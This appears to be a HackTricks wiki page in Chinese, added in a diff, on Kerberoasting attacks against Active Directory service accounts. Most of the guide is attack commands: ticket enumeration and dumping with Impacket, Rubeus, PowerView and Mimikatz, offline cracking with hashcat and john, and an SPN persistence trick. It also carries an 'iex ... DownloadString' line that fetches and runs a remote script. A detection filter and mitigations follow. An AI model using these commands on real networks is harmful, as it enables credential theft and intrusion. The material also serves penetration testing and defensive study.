@@ -1,0 +1,381 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Kerberoast</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="kerberoast"><a class="header" href="#kerberoast">Kerberoast</a></h1>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=kerberoast"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+立即获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=kerberoast" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 渗透测试：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 渗透测试： <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="kerberoast-1"><a class="header" href="#kerberoast-1">Kerberoast</a></h2>
+<p>Kerberoasting 关注于获取 <strong>TGS 票证</strong>，特别是与 <strong>Active Directory (AD)</strong> 中 <strong>用户账户</strong> 相关的服务，排除 <strong>计算机账户</strong>。这些票证的加密使用源自 <strong>用户密码</strong> 的密钥，从而允许 <strong>离线凭证破解</strong> 的可能性。使用用户账户作为服务的标志是 <strong>"ServicePrincipalName"</strong> 属性非空。</p>
+<p>执行 <strong>Kerberoasting</strong> 需要一个能够请求 <strong>TGS 票证</strong> 的域账户；然而，这一过程并不需要 <strong>特殊权限</strong>，使得任何拥有 <strong>有效域凭证</strong> 的人都可以访问。</p>
+<h3 id="关键点"><a class="header" href="#关键点">关键点：</a></h3>
+<ul>
+<li><strong>Kerberoasting</strong> 以 <strong>AD</strong> 中的 <strong>用户账户服务</strong> 为目标 <strong>TGS 票证</strong>。</li>
+<li>使用 <strong>用户密码</strong> 密钥加密的票证可以 <strong>离线破解</strong>。</li>
+<li>服务通过 <strong>ServicePrincipalName</strong> 的非空值来识别。</li>
+<li><strong>不需要特殊权限</strong>，只需 <strong>有效域凭证</strong>。</li>
+</ul>
+<h3 id="攻击"><a class="header" href="#攻击"><strong>攻击</strong></a></h3>
+<p>{% hint style="warning" %}
+<strong>Kerberoasting 工具</strong> 通常在执行攻击和发起 TGS-REQ 请求时请求 <strong><code>RC4 加密</code></strong>。这是因为 <strong>RC4 是</strong> <a href="https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795"><strong>较弱的</strong></a>，并且比其他加密算法（如 AES-128 和 AES-256）更容易使用 Hashcat 等工具进行离线破解。<br />
+RC4（类型 23）哈希以 <strong><code>$krb5tgs$23$*</code></strong> 开头，而 AES-256（类型 18）以 <strong><code>$krb5tgs$18$*</code></strong> 开头。`
+{% endhint %}</p>
+<h4 id="linux"><a class="header" href="#linux"><strong>Linux</strong></a></h4>
+<pre><code class="language-bash"># Metasploit framework
+msf&gt; use auxiliary/gather/get_user_spns
+# Impacket
+GetUserSPNs.py -request -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast # Password will be prompted
+GetUserSPNs.py -request -dc-ip &lt;DC_IP&gt; -hashes &lt;LMHASH&gt;:&lt;NTHASH&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast
+# kerberoast: https://github.com/skelsec/kerberoast
+kerberoast ldap spn 'ldap+ntlm-password://&lt;DOMAIN.FULL&gt;\&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt;' -o kerberoastable # 1. Enumerate kerberoastable users
+kerberoast spnroast 'kerberos+password://&lt;DOMAIN.FULL&gt;\&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt;' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
+</code></pre>
+<p>多功能工具，包括可进行kerberoast的用户转储：</p>
+<pre><code class="language-bash"># ADenum: https://github.com/SecuProject/ADenum
+adenum -d &lt;DOMAIN.FULL&gt; -ip &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -c
+</code></pre>
+<h4 id="windows"><a class="header" href="#windows">Windows</a></h4>
+<ul>
+<li><strong>枚举可Kerberoast的用户</strong></li>
+</ul>
+<pre><code class="language-powershell"># Get Kerberoastable users
+setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
+Get-NetUser -SPN | select serviceprincipalname #Powerview
+.\Rubeus.exe kerberoast /stats
+</code></pre>
+<ul>
+<li><strong>技术 1：请求 TGS 并从内存中转储它</strong></li>
+</ul>
+<pre><code class="language-powershell">#Get TGS in memory from a single user
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
+
+#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
+setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+#List kerberos tickets in memory
+klist
+
+# Extract them from memory
+Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+
+# Transform kirbi ticket to john
+python2.7 kirbi2john.py sqldev.kirbi
+# Transform john to hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat
+</code></pre>
+<ul>
+<li><strong>技术 2：自动化工具</strong></li>
+</ul>
+<pre><code class="language-bash"># Powerview: Get Kerberoast hash of a user
+Request-SPNTicket -SPN "&lt;SPN&gt;" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+# Powerview: Get all Kerberoast hashes
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+
+# Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
+
+# Invoke-Kerberoast
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+</code></pre>
+<p>{% hint style="warning" %}
+当请求 TGS 时，Windows 事件 <code>4769 - A Kerberos service ticket was requested</code> 被生成。
+{% endhint %}</p>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=kerberoast"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=kerberoast" %}</p>
+<h3 id="破解"><a class="header" href="#破解">破解</a></h3>
+<pre><code class="language-bash">john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</code></pre>
+<h3 id="持久性"><a class="header" href="#持久性">持久性</a></h3>
+<p>如果你对一个用户拥有<strong>足够的权限</strong>，你可以<strong>使其可进行kerberoast</strong>：</p>
+<pre><code class="language-bash">Set-DomainObject -Identity &lt;username&gt; -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+</code></pre>
+<p>您可以在这里找到用于<strong>kerberoast</strong>攻击的有用<strong>工具</strong>: <a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
+<p>如果您在Linux中发现此<strong>错误</strong>: <strong><code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></strong>，这可能是由于您的本地时间，您需要将主机与DC同步。有几个选项：</p>
+<ul>
+<li><code>ntpdate &lt;IP of DC&gt;</code> - 自Ubuntu 16.04起已弃用</li>
+<li><code>rdate -n &lt;IP of DC&gt;</code></li>
+</ul>
+<h3 id="缓解措施"><a class="header" href="#缓解措施">缓解措施</a></h3>
+<p>如果可利用，Kerberoasting可以以高度隐蔽的方式进行。为了检测此活动，应关注<strong>安全事件ID 4769</strong>，该事件表示请求了Kerberos票证。然而，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：</p>
+<ul>
+<li>服务名称不应为<strong>krbtgt</strong>，因为这是正常请求。</li>
+<li>以**$**结尾的服务名称应被排除，以避免包括用于服务的计算机帐户。</li>
+<li>应通过排除格式为<strong>machine@domain</strong>的帐户名称来过滤来自计算机的请求。</li>
+<li>仅应考虑成功的票证请求，通过失败代码**'0x0'**进行识别。</li>
+<li><strong>最重要的是</strong>，票证加密类型应为<strong>0x17</strong>，这通常在Kerberoasting攻击中使用。</li>
+</ul>
+<pre><code class="language-bash">Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
+</code></pre>
+<p>为了降低Kerberoasting的风险：</p>
+<ul>
+<li>确保<strong>服务账户密码难以猜测</strong>，建议长度超过<strong>25个字符</strong>。</li>
+<li>利用<strong>托管服务账户</strong>，提供如<strong>自动密码更改</strong>和<strong>委派服务主体名称（SPN）管理</strong>等好处，增强对这种攻击的安全性。</li>
+</ul>
+<p>通过实施这些措施，组织可以显著降低与Kerberoasting相关的风险。</p>
+<h2 id="kerberoast-wo-domain-account"><a class="header" href="#kerberoast-wo-domain-account">Kerberoast w/o domain account</a></h2>
+<p>在<strong>2022年9月</strong>，一位名为Charlie Clark的研究人员揭示了一种新的系统利用方式，通过他的平台<a href="https://exploit.ph/">exploit.ph</a>分享。这种方法允许通过<strong>KRB_AS_REQ</strong>请求获取<strong>服务票据（ST）</strong>，而不需要控制任何Active Directory账户。基本上，如果一个主体设置为不需要预身份验证——这种情况类似于网络安全领域所称的<strong>AS-REP Roasting攻击</strong>——则可以利用这一特性来操纵请求过程。具体而言，通过更改请求主体中的<strong>sname</strong>属性，系统被欺骗发出<strong>ST</strong>而不是标准的加密票据授予票据（TGT）。</p>
+<p>该技术在这篇文章中有详细解释：<a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">Semperis博客文章</a>。</p>
+<p>{% hint style="warning" %}
+您必须提供用户列表，因为我们没有有效的账户来使用此技术查询LDAP。
+{% endhint %}</p>
+<h4 id="linux-1"><a class="header" href="#linux-1">Linux</a></h4>
+<ul>
+<li><a href="https://github.com/fortra/impacket/pull/1413">impacket/GetUserSPNs.py from PR #1413</a>:</li>
+</ul>
+<pre><code class="language-bash">GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+</code></pre>
+<h4 id="windows-1"><a class="header" href="#windows-1">Windows</a></h4>
+<ul>
+<li><a href="https://github.com/GhostPack/Rubeus/pull/139">GhostPack/Rubeus from PR #139</a>:</li>
+</ul>
+<pre><code class="language-bash">Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+</code></pre>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li><a href="https://www.tarlogic.com/blog/how-to-attack-kerberos/">https://www.tarlogic.com/blog/how-to-attack-kerberos/</a></li>
+<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting</a></li>
+<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=kerberoast"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=kerberoast" %}</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/golden-ticket.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/kerberos-authentication.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/golden-ticket.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/kerberos-authentication.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
